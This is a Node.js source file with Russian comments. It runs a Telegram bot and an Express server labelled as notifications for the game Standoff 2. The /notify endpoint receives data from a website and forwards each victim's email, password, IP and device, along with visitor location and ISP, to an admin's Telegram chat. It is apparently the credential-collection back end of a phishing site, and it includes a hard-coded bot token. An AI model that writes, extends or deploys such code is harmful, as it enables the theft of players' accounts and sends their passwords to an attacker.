const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// ===== ТВОИ ДАННЫЕ =====
const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ'; // ← вставь свой
const ADMIN_ID = 5015075680;
const PORT = process.env.PORT || 3000;
const SECRET = 'my_super_secret_2026'; // придумай свой пароль

// ===== БОТ =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Telegram-бот запущен');

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id,
        '🔐 *Бот уведомлений Standoff 2*\n\nТвой chat\\_id: `' + msg.chat.id + '`',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/test/, (msg) => {
    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
});

// ===== ФУНКЦИИ ОТПРАВКИ =====
function sendAccount(data) {
    const text =
        '🔐 *НОВЫЙ АККАУНТ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '📧 Почта: `' + (data.email || '?') + '`\n' +
        '🔑 Пароль: `' + (data.password || '?') + '`\n' +
        '🌐 IP: `' + (data.ip || '?') + '`\n' +
        '📱 Устройство: ' + ((data.user_agent || '').substring(0, 50)) + '...\n' +
        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
        .catch(err => console.error('TG:', err.message));
}

function sendVisitor(data) {
    const text =
        '👤 *НОВЫЙ ПОСЕТИТЕЛЬ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '🌐 IP: `' + (data.ip || '?') + '`\n' +
        '🌍 Страна: ' + (data.country || '?') + '\n' +
        '🏙 Город: ' + (data.city || '?') + '\n' +
        '📡 Провайдер: ' + (data.org || '?') + '\n' +
        '📺 Экран: ' + (data.screen || '?') + '\n' +
        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
        .catch(err => console.error('TG:', err.message));
}

// ===== HTTP-СЕРВЕР =====
const app = express();
app.use(express.json());

// Приём данных с сайта
app.post('/notify', (req, res) => {
    const { type, secret, data } = req.body;

    if (secret !== SECRET) {
        return res.status(401).json({ error: 'unauthorized' });
    }

    if (type === 'account') {
        sendAccount(data);
    } else if (type === 'visitor') {
        sendVisitor(data);
    }

    res.json({ ok: true });
});

// Проверка, что сервер жив
app.get('/', (req, res) => res.send('Bot is running'));

app.listen(PORT, () => {
    console.log('🚀 HTTP-сервер запущен на порту ' + PORT);
});
